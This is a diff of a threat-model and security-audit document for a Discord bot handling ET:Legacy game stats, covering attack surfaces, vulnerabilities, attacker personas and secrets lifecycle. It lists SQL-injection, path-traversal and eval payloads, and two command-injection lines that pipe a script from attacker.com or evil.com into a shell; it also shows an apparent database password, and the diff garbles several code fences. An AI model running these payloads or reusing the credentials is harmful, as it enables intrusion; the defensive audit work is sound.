@@ -20,6 +20,7 @@ This is a living security audit document designed for continuous study and impro
 6. **Documents defense gaps** (what we DON'T protect against)
 
 **Current Security Assessment:**
+
 - **Overall Risk Level:** MEDIUM-HIGH
 - **Production Ready:** NO (security hardening required)
 - **External Facing:** YES (Discord API, SSH, PostgreSQL)
@@ -50,11 +51,12 @@ This is a living security audit document designed for continuous study and impro
 ## Attack Surface Mapping
 
 ### Definition
+
 **Attack Surface:** Every point where an attacker can input data or interact with the system.
 
 ### Complete Attack Surface
 
-```
+```python
 ┌─────────────────────────────────────────────────────────────────┐
 │                     EXTERNAL WORLD (UNTRUSTED)                  │
 └─────────────────────────────────────────────────────────────────┘
@@ -85,7 +87,7 @@ This is a living security audit document designed for continuous study and impro
     ├─ SQL queries                  ├─ Stats parsing               ├─ Code execution
     ├─ Connection strings           ├─ Line parsing                ├─ Import statements
     └─ Credentials                  └─ Regex matching              └─ Environment vars
-```
+```python
 
 ### Attack Surface Inventory
 
@@ -108,6 +110,7 @@ This is a living security audit document designed for continuous study and impro
 | 15 | Log files | Text | OUTPUT | None | ❌ |
 
 **Key:**
+
 - ✅ = Tested and validated
 - ⚠️ = Partially tested (only filename, not content)
 - ❌ = NOT tested or validated
@@ -201,6 +204,7 @@ This is a living security audit document designed for continuous study and impro
 
 **Risk Calculation:** Likelihood × Impact
 **Mitigation Status:**
+
 - ✅ YES = Fully mitigated
 - ⚠️ PARTIAL = Partially mitigated
 - ❌ NO = Not mitigated
@@ -214,17 +218,20 @@ This is a living security audit document designed for continuous study and impro
 **Entry Point:** `bot/ultimate_bot.py:_handle_webhook_trigger()`
 
 **Data Flow:**
-```
+
+```text
 Discord → Webhook → Bot → Filename extraction → SSH download → Parser → Database
-```
+```python
 
 **Input Fields:**
+
 - `message.webhook_id` - Numeric string (18-20 digits)
 - `message.content` - Text containing filename in backticks
 - `message.author.name` - Webhook username
 - `message.embeds` - Optional embed content
 
 **Validation:**
+
 - ✅ Webhook ID whitelist check
 - ✅ Filename regex validation
 - ✅ Username check
@@ -232,6 +239,7 @@ Discord → Webhook → Bot → Filename extraction → SSH download → Parser 
 - ❌ Message length NOT limited
 
 **Attack Vectors:**
+
 | Attack | Payload | Expected Defense | Actual Defense |
 |--------|---------|------------------|----------------|
 | Path traversal | `../../../etc/passwd.txt` | Filename regex | ✅ BLOCKED |
@@ -243,6 +251,7 @@ Discord → Webhook → Bot → Filename extraction → SSH download → Parser 
 | Homograph attack | Cyrillic 'a' instead of Latin 'a' | ? | ❌ UNKNOWN |
 
 **Untested Scenarios:**
+
 - What happens if webhook sends 1000 embeds?
 - Can we overflow the Discord message queue?
 - What if webhook_id is a string that looks numeric but isn't?
@@ -254,11 +263,13 @@ Discord → Webhook → Bot → Filename extraction → SSH download → Parser 
 **Entry Point:** `bot/cogs/*.py` - All command handlers
 
 **Data Flow:**
-```
+
+```text
 Discord user → !command args → Command parser → Bot logic → Database/Server
-```
+```python
 
 **Input Fields:**
+
 - Command name (!stats, !server_restart, etc.)
 - Command arguments (player names, dates, etc.)
 - User ID
@@ -266,12 +277,14 @@ Discord user → !command args → Command parser → Bot logic → Database/Ser
 - Guild ID
 
 **Validation:**
+
 - ⚠️ Admin check (channel-based only)
 - ❌ Argument parsing NOT validated
 - ❌ Length limits NOT enforced
 - ❌ SQL injection in custom queries?
 
 **Attack Vectors:**
+
 | Command | Attack Payload | Risk | Tested? |
 |---------|---------------|------|---------|
 | !stats | `!stats '; DROP TABLE sessions;--` | SQL injection | ❌ |
@@ -282,6 +295,7 @@ Discord user → !command args → Command parser → Bot logic → Database/Ser
 | Any | 10MB command argument | DoS (memory) | ❌ |
 
 **Dangerous Commands (Require Admin):**
+
 - `!server_start` - Executes shell command
 - `!server_stop` - Executes shell command
 - `!server_restart` - Executes shell command
@@ -298,13 +312,15 @@ Discord user → !command args → Command parser → Bot logic → Database/Ser
 **Entry Point:** `bot/community_stats_parser.py:parse_stats_file()`
 
 **Data Flow:**
-```
+
+```text
 VPS stats file → SSH download → Local file → Parser → Database
-```
+```python
 
 **Input:** Raw text file (supposedly ET:Legacy stats format)
 
 **Validation:**
+
 - ✅ Filename validated
 - ❌ File size NOT checked (DOS via huge file)
 - ❌ Line count NOT limited
@@ -312,6 +328,7 @@ VPS stats file → SSH download → Local file → Parser → Database
 - ❌ Character encoding NOT enforced (uses errors='ignore')
 
 **Attack Vectors:**
+
 | Attack | Payload | Risk | Impact |
 |--------|---------|------|--------|
 | Huge file | 1GB stats file | DoS | Bot hangs/crashes |
@@ -324,6 +341,7 @@ VPS stats file → SSH download → Local file → Parser → Database
 | Format string | Player name: `%s%s%s%s%s` | Information disclosure | ? |
 
 **Parser Assumptions:**
+
 - File is valid ET:Legacy format
 - Player names don't contain malicious content
 - Numbers are reasonable (0-999 range)
@@ -338,17 +356,20 @@ VPS stats file → SSH download → Local file → Parser → Database
 **Entry Point:** `bot/automation/ssh_handler.py:SSHHandler`
 
 **Data Flow:**
-```
+
+```text
 Bot → SSH client → Network → VPS SSHD → File transfer
-```
+```yaml
 
 **Authentication:**
+
 - Private key: `~/.ssh/etlegacy_bot`
 - Host: `puran.hehe.si:48101`
 - User: `et`
 - Host key verification: **AutoAddPolicy** (DANGEROUS!)
 
 **Attack Vectors:**
+
 | Attack | Scenario | Risk | Mitigated? |
 |--------|----------|------|------------|
 | MITM | Attacker intercepts SSH connection | CRITICAL | ❌ NO |
@@ -359,11 +380,13 @@ Bot → SSH client → Network → VPS SSHD → File transfer
 | Downgrade attack | Force SSH to weak cipher | MEDIUM | ❌ NO |
 
 **Current SSH Configuration:**
+
 ```python
 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # ACCEPTS ANY HOST KEY!
-```
+```python
 
 **This means:**
+
 - First connection: Accepts ANY server (even attacker's)
 - Subsequent connections: Checks known_hosts, but accepts new keys
 - MITM attack trivial on first connection
@@ -375,11 +398,13 @@ ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # ACCEPTS ANY HOST KE
 **Entry Point:** `bot/core/database_adapter.py`
 
 **Connection String:**
+
 ```python
 postgres://etlegacy_user:etlegacy_secure_2025@192.168.64.116:5432/etlegacy
-```
+```yaml
 
 **Attack Vectors:**
+
 | Attack | Scenario | Risk | Mitigated? |
 |--------|----------|------|------------|
 | Credential theft | .env file exposed | CRITICAL | ⚠️ File perms |
@@ -388,18 +413,20 @@ postgres://etlegacy_user:etlegacy_secure_2025@192.168.64.116:5432/etlegacy
 | SQL injection | Malicious input → SQL query | CRITICAL | ✅ Parameterized |
 
 **Parameterized Queries (GOOD):**
+
 ```python
 await conn.execute(
     "INSERT INTO sessions (map_name) VALUES ($1)",
     map_name  # Safe - parameter binding
 )
-```
+```text
 
 **String Formatting (DANGEROUS - if used anywhere):**
+
 ```python
 # NEVER DO THIS:
 query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
-```
+```python
 
 **Audit Required:** Search entire codebase for string formatting in SQL queries.
 
@@ -410,6 +437,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 ### CRITICAL (Immediate Fix Required)
 
 **1. SSH Man-in-the-Middle (MITM)**
+
 - **File:** `bot/automation/ssh_handler.py`
 - **Issue:** `AutoAddPolicy()` accepts ANY SSH server
 - **Exploit:** Attacker intercepts connection on first connect
@@ -417,6 +445,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 - **Fix:** Enable strict host key checking, pin host key
 
 **2. No File Size Limits**
+
 - **File:** `bot/ultimate_bot.py:_process_webhook_triggered_file()`
 - **Issue:** Downloads files of ANY size
 - **Exploit:** 10GB stats file exhausts disk/memory
@@ -424,6 +453,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 - **Fix:** Check file size before download (10MB max)
 
 **3. No Parser Timeout**
+
 - **File:** `bot/community_stats_parser.py:parse_stats_file()`
 - **Issue:** Parser can run forever on malformed file
 - **Exploit:** Huge/malformed file causes infinite loop
@@ -433,6 +463,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 ### HIGH (Fix Soon)
 
 **4. Admin Commands Use Channel ID Only**
+
 - **File:** `bot/cogs/server_control.py`
 - **Issue:** Admin check only verifies channel, not user role
 - **Exploit:** Anyone posting in admin channel = admin
@@ -440,6 +471,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 - **Fix:** Check Discord user roles (Administrator, Moderator)
 
 **5. No Webhook Signature Validation**
+
 - **File:** `bot/ultimate_bot.py:_handle_webhook_trigger()`
 - **Issue:** Only checks webhook ID, no HMAC signature
 - **Exploit:** If webhook ID leaks, attacker can spoof
@@ -447,6 +479,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 - **Fix:** Implement HMAC-SHA256 signature verification
 
 **6. Secrets in Logs**
+
 - **Files:** All files using `logger.error()`, `logger.debug()`
 - **Issue:** Never audited logs for secret leakage
 - **Exploit:** Database password in connection error logs
@@ -456,6 +489,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 ### MEDIUM (Fix When Possible)
 
 **7. No Rate Limiting on Bot Commands**
+
 - **Files:** `bot/cogs/*.py`
 - **Issue:** Users can spam commands
 - **Exploit:** Flood bot with !stats requests
@@ -463,6 +497,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 - **Fix:** Rate limit per-user per-command
 
 **8. Unicode Normalization Not Enforced**
+
 - **Files:** All user input processing
 - **Issue:** Homograph attacks, encoding issues
 - **Exploit:** Player name "admin" vs "аdmin" (Cyrillic)
@@ -470,6 +505,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 - **Fix:** Normalize all Unicode to NFC
 
 **9. No Database Input Validation**
+
 - **Files:** All database INSERT statements
 - **Issue:** Invalid data ranges accepted
 - **Exploit:** Negative kill counts, year 3000
@@ -479,11 +515,13 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 ### LOW (Nice to Have)
 
 **10. No Log Rotation**
+
 - **Issue:** Logs grow forever
 - **Impact:** Disk space exhaustion
 - **Fix:** Implement log rotation (logrotate)
 
 **11. No Audit Trail**
+
 - **Issue:** Admin actions not logged
 - **Impact:** Can't trace who did what
 - **Fix:** Log all admin commands with user ID
@@ -499,6 +537,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 **Scenario:** Attacker creates 1000s of Discord accounts and floods bot with commands
 
 **Attack Steps:**
+
 1. Create bot farm (1000 Discord accounts)
 2. Flood `!stats` command (1000 requests/second)
 3. Bot exhausts database connections
@@ -515,6 +554,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 **Scenario:** Attacker compromises VPS, creates symlink in stats directory
 
 **Attack Steps:**
+
 1. Compromise VPS (separate vulnerability)
 2. Create symlink: `ln -s /etc/shadow 2025-12-14-120000-goldrush-round-1.txt`
 3. Bot downloads "/etc/shadow" thinking it's stats file
@@ -531,6 +571,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 **Scenario:** Attacker uploads malicious package to PyPI
 
 **Attack Steps:**
+
 1. Identify internal package name (e.g., "etlegacy-stats")
 2. Upload malicious package with same name to PyPI
 3. `pip install` downloads malicious package
@@ -547,6 +588,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 **Scenario:** Bot crashes between download and marking file as processed
 
 **Attack Steps:**
+
 1. Trigger file download
 2. Kill bot mid-processing (timing attack)
 3. Bot restarts, re-processes same file
@@ -563,6 +605,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 **Scenario:** Attacker manipulates Discord channel permissions
 
 **Attack Steps:**
+
 1. Create channel with same ID as admin channel (Discord glitch?)
 2. OR: Discord admin accidentally gives attacker access to admin channel
 3. Attacker now has admin commands
@@ -578,6 +621,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 **Scenario:** Attacker modifies .env file (separate compromise)
 
 **Attack Steps:**
+
 1. Gain write access to .env (file permission error)
 2. Change `POSTGRES_HOST` to attacker's server
 3. Bot connects to malicious database
@@ -594,10 +638,15 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 **Scenario:** Player name contains Python code that gets eval'd
 
 **Attack Steps:**
+
 1. VPS compromised, creates stats file with:
-   ```
-   Player: __import__('os').system('whoami')
-   ```
+
+   ```text
+
+   Player: **import**('os').system('whoami')
+
+   ```sql
+
 2. Parser processes player name
 3. If parser uses `eval()` or `exec()` anywhere...
 4. Remote Code Execution
@@ -619,6 +668,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 **Goal:** Gain unauthorized access to the bot or server
 
 **Reconnaissance:**
+
 1. Join Discord server as normal user
 2. Observe bot behavior (commands, responses, timing)
 3. Test rate limiting with spam commands
@@ -627,6 +677,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 6. Monitor webhook messages for patterns
 
 **Attack Vectors:**
+
 1. **Webhook URL Leakage**
    - Search GitHub for accidental commits with webhook URLs
    - Check pastebin, Discord message history
@@ -643,6 +694,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
    - Trigger webhook with 1GB filename
 
 **Success Criteria:**
+
 - SQL injection succeeds → Database access
 - Command injection succeeds → Server access
 - DoS succeeds → Bot offline
@@ -657,21 +709,25 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 **Initial Compromise:** Assume VPS is compromised via separate vulnerability (SSH brute force, CVE, etc.)
 
 **Attack Chain:**
+
 1. **Reconnaissance**
+
    ```bash
    # On compromised VPS
    ls /home/et/.etlegacy/legacy/gamestats
    ps aux | grep python  # Find running scripts
    cat /home/et/scripts/stats_webhook_notify.py
-   ```
+   ```text
 
 2. **Webhook URL Extraction**
+
    ```bash
    grep -r "discord.com/api/webhooks" /home/et/
    # Found: DISCORD_WEBHOOK_URL in script
-   ```
+   ```text
 
 3. **Malicious Stats File Injection**
+
    ```bash
    # Create malicious stats file
    cat > /home/et/.etlegacy/legacy/gamestats/2025-12-14-120000-payload-round-1.txt <<EOF
@@ -679,7 +735,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
    Kill: 999999999999999
    Damage: -999999
    EOF
-   ```
+   ```yaml
 
 4. **Trigger Webhook**
    - Webhook script auto-detects file
@@ -688,6 +744,7 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
    - Parser processes SQL injection in player name
 
 **Escalation Paths:**
+
 - Bot crashes → DoS
 - Database corrupted → Data loss
 - RCE achieved → Full compromise
@@ -701,25 +758,37 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 **Access Level:** Can post in admin channel
 
 **Attack Steps:**
+
 1. **Server Control Abuse**
-   ```
+
+   ```text
+
    !server_stop   # Shuts down game server
    !say "Server hacked!"  # Broadcasts message
    !kick player123  # Kicks innocent player
-   ```
+
+   ```text
 
 2. **Data Exfiltration**
-   ```
+
+   ```text
+
    !stats  # View all player stats
    !leaderboard  # View all players
-   # Copy data manually
-   ```
+
+# Copy data manually
+
+   ```text
 
 3. **Privilege Escalation Attempt**
-   ```
-   !server_restart && curl http://attacker.com/backdoor.sh | bash
-   # If command injection exists → RCE
-   ```
+
+   ```text
+
+   !server_restart && curl <http://attacker.com/backdoor.sh> | bash
+
+# If command injection exists → RCE
+
+   ```sql
 
 **Mitigation:** Audit trail of all admin commands with user IDs.
 
@@ -782,35 +851,42 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 **Be honest about what we're NOT doing:**
 
 ### 1. No Content Validation
+
 - ✅ We validate **filenames**
 - ❌ We DON'T validate **file contents**
 - **Risk:** Malicious stats file accepted if filename is valid
 
 ### 2. No User Role Checking
+
 - ✅ We check **channel ID** for admin commands
 - ❌ We DON'T check **Discord user roles**
 - **Risk:** Anyone in admin channel = admin
 
 ### 3. No Secrets Rotation
+
 - ✅ We store secrets in .env
 - ❌ We NEVER rotate: database password, bot token, SSH key
 - **Risk:** Long-lived credentials easier to compromise
 
 ### 4. No Dependency Auditing
+
 - ✅ We use requirements.txt
 - ❌ We NEVER audit for: CVEs, malicious packages, outdated deps
 - **Risk:** Using vulnerable libraries
 
 ### 5. No Backup Verification
+
 - ✅ We backup database (maybe)
 - ❌ We NEVER test restoring backups
 - **Risk:** Backups might be corrupted/unusable
 
 ### 6. No Incident Response Plan
+
 - ❌ No documented process for: security incident, data breach, compromise
 - **Risk:** Chaos during actual attack
 
 ### 7. No Security Training
+
 - ❌ Contributors not trained on: secure coding, threat modeling, common vulns
 - **Risk:** New vulnerabilities introduced
 
@@ -822,7 +898,8 @@ query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL INJECTION!
 
 ### Path 1: Discord User → Admin
 
-```
+```text
+
 User joins Discord
   ↓
 Discovers admin channel ID (leaked in message history?)
@@ -834,9 +911,11 @@ Posts !server_restart
 Bot accepts command (no role check)
   ↓
 Admin privilege achieved
-```
+
+```yaml
 
 **Mitigations:**
+
 - ❌ No user role verification
 - ⚠️ Admin channel ID not secret
 - ❌ No audit trail
@@ -845,7 +924,8 @@ Admin privilege achieved
 
 ### Path 2: VPS Read Access → Bot Compromise
 
-```
+```python
+
 Attacker gets SSH read-only access to VPS
   ↓
 Reads /home/et/scripts/stats_webhook_notify.py
@@ -857,9 +937,11 @@ Creates malicious stats file locally
 Triggers webhook with malicious filename
   ↓
 Bot processes, RCE achieved
-```
+
+```yaml
 
 **Mitigations:**
+
 - ✅ Filename validation (blocks RCE via filename)
 - ❌ No webhook signature (URL alone is enough)
 - ❌ No content validation
@@ -868,7 +950,8 @@ Bot processes, RCE achieved
 
 ### Path 3: Database Read Access → Discord Bot Token
 
-```
+```text
+
 Attacker gains read access to PostgreSQL
   ↓
 Searches for secrets in database
@@ -878,9 +961,11 @@ Finds bot token in config table? (if stored)
 Uses token to impersonate bot
   ↓
 Full bot access achieved
-```
+
+```sql
 
 **Mitigations:**
+
 - ❓ Unknown if bot token stored in DB
 - ⚠️ Database encrypted at rest?
 
@@ -892,12 +977,13 @@ Full bot access achieved
 
 ### Discord Bot Token
 
-```
+```python
+
 Creation: Discord Developer Portal
   ↓
 Storage: .env file (filesystem)
   ↓
-Loading: bot/config.py:Config.__init__()
+Loading: bot/config.py:Config.**init**()
   ↓
 Usage: discord.Client(token=...)
   ↓
@@ -906,9 +992,11 @@ Memory: Process memory (readable via /proc/PID/environ)
 Logs: Hope not, but audit required!
   ↓
 Destruction: Never (process exit only)
-```
+
+```bash
 
 **Exposure Points:**
+
 - .env file permissions (chmod 600?)
 - Config loading (environment variable visible to all processes?)
 - Error logs (token in traceback?)
@@ -918,7 +1006,8 @@ Destruction: Never (process exit only)
 
 ### Database Credentials
 
-```
+```python
+
 Creation: Manual (DBA sets password)
   ↓
 Storage: .env file
@@ -932,9 +1021,11 @@ Network: Sent over network (encrypted?)
 Logs: Connection errors leak password?
   ↓
 Destruction: Never
-```
+
+```yaml
 
 **Exposure Points:**
+
 - Network sniffing (SSL/TLS used?)
 - Connection error messages
 - Process environment variables
@@ -943,7 +1034,8 @@ Destruction: Never
 
 ### SSH Private Key
 
-```
+```yaml
+
 Creation: ssh-keygen (one-time)
   ↓
 Storage: ~/.ssh/etlegacy_bot
@@ -955,9 +1047,11 @@ Memory: Key loaded into process memory
 Network: Key used for authentication (never sent)
   ↓
 Destruction: Never
+
 ```
 
 **Exposure Points:**
+
 - File permissions (chmod 600?)
 - Memory dumps
 - Swap files (key written to disk if swapped?)
@@ -979,6 +1073,7 @@ Destruction: Never
 | RCON password | .env plaintext | Never | Never | Server control |
 
 **Recommendations:**
+
 1. Use secrets manager (HashiCorp Vault, AWS Secrets Manager)
 2. Rotate secrets quarterly
 3. Set expiration on all secrets
@@ -995,6 +1090,7 @@ Destruction: Never
 **Based on:** Real incidents where bot tokens committed to GitHub
 
 **Attack Steps:**
+
 1. Developer commits .env to GitHub by accident
 2. Automated scrapers find bot token within minutes
 3. Attacker uses token to:
@@ -1007,6 +1103,7 @@ Destruction: Never
 **Impact:** CRITICAL
 
 **Prevention:**
+
 - .gitignore for .env
 - Pre-commit hooks to block secrets
 - Git secrets scanning (truffleHog)
@@ -1019,6 +1116,7 @@ Destruction: Never
 **Based on:** Common logging mistakes
 
 **Attack Steps:**
+
 1. Database connection fails (wrong password)
 2. Error logged: `asyncpg.exceptions.InvalidPasswordError: password authentication failed for user "etlegacy_user" with password "etlegacy_secure_2025"`
 3. Attacker with log access → full database access
@@ -1027,6 +1125,7 @@ Destruction: Never
 **Impact:** CRITICAL
 
 **Prevention:**
+
 - Sanitize all log output
 - Never log connection strings
 - Redact passwords in tracebacks
@@ -1038,6 +1137,7 @@ Destruction: Never
 **Based on:** Discord bots with weak admin checks
 
 **Attack Steps:**
+
 1. Attacker notices bot only checks channel ID
 2. Social engineers server admin to grant channel access
 3. Runs: `!server_restart && curl evil.com/backdoor | sh`
@@ -1047,6 +1147,7 @@ Destruction: Never
 **Impact:** CRITICAL
 
 **Prevention:**
+
 - Check Discord user roles (Administrator, Moderator)
 - Whitelist specific user IDs for dangerous commands
 - Confirm dangerous commands with reaction emoji
@@ -1105,11 +1206,13 @@ Destruction: Never
 **Approach:** Treat bot as closed system, test only via external interfaces
 
 **Tools:**
+
 - Discord user account (not admin)
 - Burp Suite for webhook interception
 - Custom Python scripts for fuzzing
 
 **Tests:**
+
 - Can you bypass rate limiting?
 - Can you inject SQL via bot commands?
 - Can you crash the bot?
@@ -1122,11 +1225,13 @@ Destruction: Never
 **Approach:** Limited code access, test with some knowledge
 
 **Tools:**
+
 - Source code review
 - Static analysis (Bandit, Semgrep)
 - Dependency scanning (pip audit)
 
 **Tests:**
+
 - Grep for `eval(`, `exec(`, `subprocess.run(`
 - Find all SQL queries, verify parameterization
 - Check all user input handling
@@ -1139,17 +1244,20 @@ Destruction: Never
 **Approach:** Full adversarial simulation
 
 **Setup:**
+
 1. Red team: Tries to compromise bot (3 people, 1 day)
 2. Blue team: Defends and monitors (1 person)
 3. Purple team: Documents findings (1 person)
 
 **Scenarios:**
+
 - Scenario 1: External attacker (no access)
 - Scenario 2: Discord server member (low privilege)
 - Scenario 3: VPS compromise
 - Scenario 4: Insider threat (moderator)
 
 **Success Metrics:**
+
 - Time to compromise
 - What was compromised (database, server, bot)
 - What data was exfiltrated
@@ -1162,6 +1270,7 @@ Destruction: Never
 **Tool:** AFL, LibFuzzer, or custom fuzzer
 
 **Targets:**
+
 - Stats file parser (feed random data)
 - Discord command parser
 - Filename validation
@@ -1175,6 +1284,7 @@ Destruction: Never
 **Manual review by someone who didn't write the code:**
 
 **Checklist:**
+
 - [ ] All user input validated
 - [ ] No SQL string concatenation
 - [ ] No `eval()` or `exec()` on user input
